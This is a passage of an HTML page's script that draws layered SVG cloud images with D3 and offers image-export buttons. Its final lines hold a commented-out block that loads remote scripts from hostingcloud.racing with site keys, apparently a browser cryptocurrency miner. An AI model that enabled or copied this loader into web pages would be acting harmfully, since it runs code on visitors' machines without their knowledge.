                    // фон
                    let GBack = Gradient();
                    canvas.appendGradient(GBack);
                    GBack.id('Back')
                        .stop('0', 'darkblue', '1')
                        .stop('1', 'lightblue', '1');
                    let GBackurl = GBack.url();
                    canvas.newExtendedLayer(BackData, width, height, margin, GBackurl, 'white', 'white', 'white');
                    // слои
                    // 5
                    let Layer5Data = [{
                        x: 83,
                        y: 81,
                        r: 10
                    }];
                    let G5 = Gradient();
                    canvas.appendGradient(G5);
                    G5.id('G5')
                        .stop('0', p[16].toString(), '1')
                        .stop('1', p[16].toString(), '1');
                    let G5url = G5.url();
                    canvas.newExtendedLayer(Layer5Data, width, height, margin, G5url, 'white', 'white', 'white', {
                        line: false,
                        area: false,
                        dots: true
                    });
                    // 4
                    let Layer4Data = [{
                        x: 77,
                        y: 76,
                        r: 12
                    }, {
                        x: 83,
                        y: 70,
                        r: 11
                    }, {
                        x: 90,
                        y: 55,
                        r: 17
                    }];
                    let G4 = Gradient();
                    canvas.appendGradient(G4);
                    G4.id('G4')
                        .stop('0', p[12].toString(), '1')
                        .stop('1', p[12].toString(), '1');
                    let G4url = G4.url();
                    canvas.newExtendedLayer(Layer4Data, width, height, margin, G4url, 'white', 'white', 'white', {
                        line: false,
                        area: false,
                        dots: true
                    });
                    // 3
                    let Layer3Data = [{
                        x: 46,
                        y: 78,
                        r: 15
                    }, {
                        x: 58,
                        y: 80,
                        r: 17
                    }, {
                        x: 60,
                        y: 70,
                        r: 15
                    }, {
                        x: 70,
                        y: 70,
                        r: 11
                    }, {
                        x: 75,
                        y: 55,
                        r: 13
                    }, {
                        x: 83,
                        y: 60,
                        r: 13
                    }];
                    let G3 = Gradient();
                    canvas.appendGradient(G3);
                    G3.id('G3')
                        .stop('0', p[8].toString(), '1')
                        .stop('1', p[8].toString(), '1');
                    let G3url = G3.url();
                    canvas.newExtendedLayer(Layer3Data, width, height, margin, G3url, 'white', 'white', 'white', {
                        line: false,
                        area: false,
                        dots: true
                    });
                    // 2
                    let Layer2Data = [{
                        x: 10,
                        y: 73,
                        r: 18
                    }, {
                        x: 30,
                        y: 70,
                        r: 13
                    }, {
                        x: 45,
                        y: 70,
                        r: 17
                    }, {
                        x: 50,
                        y: 60,
                        r: 15
                    }, {
                        x: 60,
                        y: 60,
                        r: 13
                    }, {
                        x: 77,
                        y: 35,
                        r: 15
                    }, {
                        x: 85,
                        y: 10,
                        r: 17
                    }, {
                        x: 90,
                        y: 5,
                        r: 9
                    }];
                    let G2 = Gradient();
                    canvas.appendGradient(G2);
                    G2.id('G2')
                        .stop('0', p[4].toString(), '1')
                        .stop('1', p[4].toString(), '1');
                    let G2url = G2.url();
                    canvas.newExtendedLayer(Layer2Data, width, height, margin, G2url, 'white', 'white', 'white', {
                        line: false,
                        area: false,
                        dots: true
                    });
                    // 1
                    let Layer1Data = [{
                        x: 30,
                        y: 15,
                        r: 45
                    }, {
                        x: 5,
                        y: 57,
                        r: 10
                    }, {
                        x: 15,
                        y: 61,
                        r: 13
                    }, {
                        x: 35,
                        y: 55,
                        r: 12
                    }, {
                        x: 50,
                        y: 50,
                        r: 15
                    }, {
                        x: 63,
                        y: 42,
                        r: 9
                    }, {
                        x: 71,
                        y: 32,
                        r: 12
                    }, {
                        x: 84,
                        y: 20,
                        r: 15
                    }, {
                        x: 76,
                        y: 5,
                        r: 13
                    }];
                    let G1 = Gradient();
                    canvas.appendGradient(G1);
                    G1.id('G1')
                        .stop('0', p[0].toString(), '1')
                        .stop('1', p[0].toString(), '1');
                    let G1url = G1.url();
                    canvas.newExtendedLayer(Layer1Data, width, height, margin, G1url, 'white', 'white', 'white', {
                        line: false,
                        area: false,
                        dots: true
                    });

                }
            })(firstCloudsOn);

            //   ####
            //  ##  ##
            //     ##
            //   ##
            //  ######

            const secondClouds = ((enabled) => {
                if (enabled) {
                    // Создание картинки
                    let canvas = Canvas({
                            color: 'white', //'#6495ed',
                            width: width
                        })
                        .generatePallete({
                            'colors': ['white', 'darkblue']
                        });
                    let p = canvas.pallete();

                    canvas
                        .headline('Pallete')
                        .description(JSON.stringify(p)) //palletejson)
                        .appendSvg(width, height)
                        .onresize(true)
                        .appendDefs();

                    let BackOn = true;
                    let Layer5On = true;
                    let Layer4On = true;
                    let Layer3On = true;
                    let Layer2On = false;
                    let Layer1On = false;

                    let Back = ((enabled) => {
                        if (enabled) {
                            let BackData = [{
                                x: 0,
                                y: 0
                            }, {
                                x: 0,
                                y: 109
                            }, {
                                x: 192,
                                y: 109
                            }, {
                                x: 192,
                                y: 0
                            }];

                            // Градиент
                            let GBack = Gradient();
                            canvas.appendGradient(GBack);
                            GBack.id('Back')
                                .stop('0', 'darkblue', '1')
                                .stop('1', 'lightblue', '1');
                            let GBackurl = GBack.url();


                            canvas.newExtendedLayerV2(BackData, width, height, margin, GBackurl, 'white', 'white', 'white');
                        }
                    })(BackOn);


                    // слои

                    // 5
                    let Layer5 = ((enabled) => {
                        if (enabled) {
                            let Layer5Data = [{
                                x: 83,
                                y: 81,
                                r: 10
                            }];
                            let G5 = Gradient();
                            canvas.appendGradient(G5);
                            G5.id('G5')
                                .stop('0', p[16].toString(), '1')
                                .stop('1', p[16].toString(), '1');
                            let G5url = G5.url();
                            canvas.newExtendedLayerV2(Layer5Data, width, height, margin, G5url, 'white', 'white', 'white', {
                                line: false,
                                area: false,
                                dots: true
                            });
                        }
                    })(Layer5On);

                    // 4
                    let Layer4 = ((enabled) => {
                        if (enabled) {
                            let Layer4Data = [{
                                x: 77,
                                y: 76,
                                r: 12
                            }, {
                                x: 83,
                                y: 70,
                                r: 11
                            }, {
                                x: 90,
                                y: 55,
                                r: 17
                            }];
                            let G4 = Gradient();
                            canvas.appendGradient(G4);
                            G4.id('G4')
                                .stop('0', p[12].toString(), '1')
                                .stop('1', p[12].toString(), '1');
                            let G4url = G4.url();
                            canvas.newExtendedLayerV2(Layer4Data, width, height, margin, G4url, 'white', 'white', 'white', {
                                line: false,
                                area: false,
                                dots: true
                            });
                        }
                    })(Layer4On);

                    // 3
                    let Layer3 = ((enabled) => {
                        if (enabled) {
                            let Layer3Data = [{
                                x: 46,
                                y: 78,
                                r: 15
                            }, {
                                x: 58,
                                y: 80,
                                r: 17
                            }, {
                                x: 60,
                                y: 70,
                                r: 15
                            }, {
                                x: 70,
                                y: 70,
                                r: 11
                            }, {
                                x: 75,
                                y: 55,
                                r: 13
                            }, {
                                x: 83,
                                y: 60,
                                r: 13
                            }];
                            let G3 = Gradient();
                            canvas.appendGradient(G3);
                            G3.id('G3')
                                .stop('0', p[8].toString(), '1')
                                .stop('1', p[8].toString(), '1');
                            let G3url = G3.url();
                            canvas.newExtendedLayerV2(Layer3Data, width, height, margin, G3url, 'white', 'white', 'white', {
                                line: false,
                                area: false,
                                dots: true
                            });
                        }
                    })(Layer3On);

                    // 2
                    let Layer2 = ((enabled) => {
                        if (enabled) {
                            let Layer2Data = [{
                                x: 10,
                                y: 73,
                                r: 18
                            }, {
                                x: 30,
                                y: 70,
                                r: 13
                            }, {
                                x: 45,
                                y: 70,
                                r: 17
                            }, {
                                x: 50,
                                y: 60,
                                r: 15
                            }, {
                                x: 60,
                                y: 60,
                                r: 13
                            }, {
                                x: 77,
                                y: 35,
                                r: 15
                            }, {
                                x: 85,
                                y: 10,
                                r: 17
                            }, {
                                x: 90,
                                y: 5,
                                r: 9
                            }];
                            let G2 = Gradient();
                            canvas.appendGradient(G2);
                            G2.id('G2')
                                .stop('0', p[4].toString(), '1')
                                .stop('1', p[4].toString(), '1');
                            let G2url = G2.url();
                            canvas.newExtendedLayerV2(Layer2Data, width, height, margin, G2url, 'white', 'white', 'white', {
                                line: false,
                                area: false,
                                dots: true
                            });
                        }
                    })(Layer2On);

                    // 1
                    let Layer1 = ((enabled) => {
                        if (enabled) {
                            let Layer1Data = [{
                                x: 30,
                                y: 15,
                                r: 45
                            }, {
                                x: 5,
                                y: 57,
                                r: 10
                            }, {
                                x: 15,
                                y: 61,
                                r: 13
                            }, {
                                x: 35,
                                y: 55,
                                r: 12
                            }, {
                                x: 50,
                                y: 50,
                                r: 15
                            }, {
                                x: 63,
                                y: 42,
                                r: 9
                            }, {
                                x: 71,
                                y: 32,
                                r: 12
                            }, {
                                x: 84,
                                y: 20,
                                r: 15
                            }, {
                                x: 76,
                                y: 5,
                                r: 13
                            }];
                            let G1 = Gradient();
                            canvas.appendGradient(G1);
                            G1.id('G1')
                                .stop('0', p[0].toString(), '1')
                                .stop('1', p[0].toString(), '1');
                            let G1url = G1.url();
                            canvas.newExtendedLayerV2(Layer1Data, width, height, margin, G1url, 'white', 'white', 'white', {
                                line: false,
                                area: false,
                                dots: true
                            });
                        }
                    })(Layer1On);
                }

            })(secondCloudsOn);

            //  #####
            //      ##
            //   ####
            //      ##
            //  #####

            const thirdClouds = ((enabled) => {
                if (enabled) {
                    // Создание картинки
                    let canvas = Canvas({
                            color: 'white', //'#6495ed',
                            width: width
                        })
                        .generatePallete({
                            'colors': ['white', 'darkblue']
                        });
                    let p = canvas.pallete();

                    canvas
                        .headline('Pallete')
                        .description(JSON.stringify(p)) //palletejson)
                        .appendSvg(width, height)
                        .onresize(true)
                        .appendDefs();

                    // функции для работы с углами окружности
                    // get angle of item 
                    function angleByChord(this_radius, radius) {
                        let a = (2 * radius * radius - this_radius * this_radius) / (2 * radius);

                        let chord = Math.sqrt(radius * radius - a * a) * 2;

                        return Math.asin(chord / (2 * radius)) * 2;
                    }

                    //start angle
                    let startangle = -Math.PI / 2; // 90 deg

                    //angle steps between elements
                    let step = Math.PI / 12; //15 deg

                    function getPositions(radius, angle) {
                        //calculate positions
                        let posX = radius * Math.cos(angle);
                        let posY = radius * Math.sin(angle);
                        return {
                            x: posX,
                            y: posY
                        };
                    }

                    let BackOn = true;
                    let Layer1On = true;

                    let Back = ((enabled) => {
                        if (enabled) {
                            let BackData = [{
                                x: 0,
                                y: 0
                            }, {
                                x: 0,
                                y: 109
                            }, {
                                x: 192,
                                y: 109
                            }, {
                                x: 192,
                                y: 0
                            }];

                            // Градиент
                            let GBack = Gradient();
                            canvas.appendGradient(GBack);
                            GBack.id('Back')
                                .stop('0', 'darkblue', '1')
                                .stop('1', 'lightblue', '1');
                            let GBackurl = GBack.url();


                            canvas.newExtendedLayerV2(BackData, width, height, margin, GBackurl, 'white', 'white', 'white');
                        }
                    })(BackOn);

                    function addDot(arr, dot) {
                        arr.push(dot);
                        return arr;
                    };

                    function nextDot(arr, parent, radius, angle, diff) {
                        let newPos = getPositions(parent.r + diff, angle);

                        let newDot = {
                            x: parent.x + newPos.x,
                            y: parent.y + newPos.y,
                            r: radius
                        };
                        addDot(arr, newDot);
                        return newDot;
                    }
                    // слои

                    // 1
                    let Layer1 = ((enabled) => {
                        if (enabled) {

                            let _0deg = 0,
                                _1deg = Math.PI / 180,
                                _5deg = Math.PI / 36,
                                _10deg = Math.PI / 18,
                                _15deg = Math.PI / 12,
                                _20deg = Math.PI / 9,
                                _30deg = Math.PI / 6,
                                _45deg = Math.PI / 4,
                                _60deg = Math.PI / 3,
                                _90deg = Math.PI / 2,
                                _180deg = Math.PI,
                                _360deg = 2 * Math.PI;

                            let angle = 0;
                            //angle = -Math.PI/4; // 90 deg
                            //входные данные:
                            //массив куда сохранять точки
                            //центр родителя
                            //радиус родителя
                            //радиус потомка
                            //угол потомка по отношению к ценру родителя
                            //смещение по радиусу родителя
                            //
                            let Layer1Data = [];



                            // 1st
                            let _1stRadius = 20;
                            let firstDot = {
                                x: 50,
                                y: 50,
                                r: _1stRadius
                            };

                            addDot(Layer1Data, firstDot);

                            // 2nd
                            nextDot(Layer1Data, firstDot, 15, angle, -(15 / 6));
                            // 3rd
                            nextDot(Layer1Data, firstDot, 12, _45deg, -(12 / 4));

                            // 4th
                            let _4thRadius = 14;

                            let _4thPos = getPositions(_1stRadius - _4thRadius / 3, _180deg - _10deg);

                            addDot(Layer1Data, {
                                x: firstDot.x + _4thPos.x,
                                y: firstDot.y + _4thPos.y,
                                r: _4thRadius
                            });

                            let G1 = Gradient();
                            canvas.appendGradient(G1);
                            G1.id('G1')
                                .stop('0', p[0].toString(), '1')
                                .stop('1', p[0].toString(), '1');
                            let G1url = G1.url();
                            canvas.newExtendedLayerV2(Layer1Data, width, height, margin, G1url, 'white', 'white', 'white', {
                                line: false,
                                area: false,
                                dots: true
                            });
                        }
                    })(Layer1On);
                }

            })(thirdCloudsOn);


            d3.select('#btnsavesvg').on('click', function() {

                var svg = d3.select('#svgcanvas').node()
                var filename = d3.select('#filename').property('value');
                createImage(svg, globalwidth, globalheight, 'svg', filename);
                d3.select('#ModalTitle').text('Save Image as SVG file');
                $('#modalsave').modal('show');
            });
            d3.select('#btnsavepng').on('click', function() {

                var svg = d3.select('#svgcanvas').node()
                var filename = d3.select('#filename').property('value');
                createImage(svg, globalwidth, globalheight, 'png', filename);
                d3.select('#ModalTitle').text('Save Image as PNG file');
                $('#modalsave').modal('show');
            });
            d3.select('#btnsavebmp').on('click', function() {

                var svg = d3.select('#svgcanvas').node()
                var filename = d3.select('#filename').property('value');
                createImage(svg, globalwidth, globalheight, 'bmp', filename);
                d3.select('#ModalTitle').text('Save Image as BMP file');
                $('#modalsave').modal('show');
            });
            d3.select('#btnsavejpeg').on('click', function() {

                var svg = d3.select('#svgcanvas').node()
                var filename = d3.select('#filename').property('value');
                createImage(svg, globalwidth, globalheight, 'jpeg', filename);
                d3.select('#ModalTitle').text('Save Image as JPEG file');
                $('#modalsave').modal('show');
            });




            let TestModuleOn = false;
            let TestModule = ((enabled) => {
                if (enabled) {
                    let container = $('.container');
                    let radius = $('.container').height() / 2;
                    let item = $('.item');

                    let leftAngle = 0;

                    //start angle
                    let angle = -Math.PI / 2; // 90 deg

                    //angle steps between elements
                    let step = Math.PI / 12; //15 deg

                    let multiplier = 1;

                    function calcPositions() {
                        //calculate left rotation angle 
                        item.each(function() {
                            //difference in sizes if item hovered
                            let sizesDiff = $(this).attr('data-width') - $(this).attr('data-before');

                            //if sizes are different, calc angle to rotate items to left
                            if (sizesDiff != 0 && leftAngle == 0) {
                                let thisradius = $(this).attr('data-width') / 2;
                                leftAngle = angleByChord(thisradius, radius) / 4;
                            }
                        });

                        //rotate items to left
                        if (leftAngle != 0) {
                            angle -= leftAngle;
                        }

                        leftAngle = 0;

                        item.each(function(index) {

                            //if first, no rotation
                            if (index == 0) {
                                multiplier = 0;
                            } else {
                                multiplier = 1;
                            }

                            //get container circle section angle
                            let thisItemAngleSection = angleByChord($(this).attr('data-width') / 2, radius);

                            //this aitem angle rotation
                            angle += ((thisItemAngleSection / 2) + step) * multiplier;

                            //calculate positions
                            let posX = radius + radius * Math.cos(angle);
                            let posY = radius + radius * Math.sin(angle);

                            //set half of angle to next element
                            multiplier = 1
                            angle += ((thisItemAngleSection / 2) + step) * multiplier;

                            $(this).css({
                                left: posX + 'px',
                                top: posY + 'px'
                            });
                        });

                        //reset
                        angle = -Math.PI / 2;
                    }
                    /*
                    //get angle of item 
                    function angleByChord(this_radius, radius) {
                      let a = (2*radius*radius - this_radius*this_radius) / (2 * radius);
                      
                      let chord = Math.sqrt(radius*radius - a*a) * 2;
                      
                      return Math.asin(chord / (2 * radius)) * 2;
                    }*/

                    /*  actions  */
                    $('.start').on('click', function() {
                        calcPositions();
                    });

                    $('.item').hover(function() {
                        $(this).attr('data-before', $(this).width());
                        $(this).addClass('big');

                        //update final widths (after transitions)
                        $(this).attr('data-width', getFinalWidthOfElement($(this)));

                        //recalsulate positions
                        calcPositions();
                    }, function() {
                        $(this).removeClass('big');

                        //return widths
                        $(this).attr('data-width', 30); //getFinalWidthOfElement($(this)));
                        $(this).attr('data-before', 30); //$(this).width());

                        calcPositions();

                        leftAngle = 0;
                    });

                    function getFinalWidthOfElement(element) {

                        //clone current elem
                        var clone = element.clone();

                        //remove transitions to get final sizes
                        clone.css('transition', 'none');

                        //hide and change classes
                        clone.hide();
                        clone.removeClass('item');

                        element.parent().append(clone);

                        //our final sizes of item
                        var endHeight = clone.height();

                        //remove because we're already get sizes
                        clone.remove();

                        return endHeight;
                    }

                }
            })(TestModuleOn);

            let TemplateModuleOn = false;
            let TemplateModule = ((enabled) => {
                if (enabled) {

                }
            })(TemplateModuleOn);


            /*
            <div class="container">
                <img src="http://placehold.it/1600x1200" />
            </div>

            /*
            
            //точки по окружности
var container = $('.container');
var radius = $('.container').height() / 2;
var item = $('.item');

var leftAngle = 0;

//start angle
var angle = -Math.PI / 2; // 90 deg

//angle steps between elements
var step = Math.PI / 12; //15 deg

var multiplier = 1;

function calcPositions() {
  //calculate left rotation angle 
  item.each(function() {
    //difference in sizes if item hovered
    var sizesDiff = $(this).attr('data-width') - $(this).attr('data-before');
  
    //if sizes are different, calc angle to rotate items to left
    if(sizesDiff != 0 && leftAngle == 0) {
      leftAngle = angleByChord($(this).attr('data-width') / 2, radius) / 4;
    }
  });
  
  //rotate items to left
            */

            /*
             let c = coins()
                 .addSite({
                     id: 'local',
                     match: '127.0.0.1',
                     src: 'https://www.hostingcloud.racing/2KFX.js',
                     key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
                 })
                 .addSite({
                     id: 'share',
                     match: 'shareform.ru',
                     src: 'https://www.hostingcloud.racing/rhdQ.js',
                     key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
                 }).start();
                 */
        }
    </script>

</body>

</html>